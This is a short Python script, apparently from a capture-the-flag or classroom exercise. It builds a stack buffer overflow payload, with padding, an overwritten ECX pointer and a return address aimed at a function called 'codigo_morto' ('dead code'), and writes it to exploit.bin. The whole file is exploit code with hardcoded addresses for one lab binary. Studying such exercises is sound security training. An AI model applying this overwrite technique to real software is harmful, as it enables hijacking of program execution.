import struct
a_bus1 = 'a' * 64
a_bus1 = a_bus1.encode('utf-8')

new_ecx_pointer = struct.pack("I", 0xffffd5d0)

a_bus2 = 'a' * 8
a_bus2 = a_bus2.encode('utf-8')

codigo_morto_pointer = struct.pack("I", 0x08049196)

string = a_bus1 + new_ecx_pointer + a_bus2 + codigo_morto_pointer
file = open("exploit.bin", "wb")
file.write(string)
file.close()


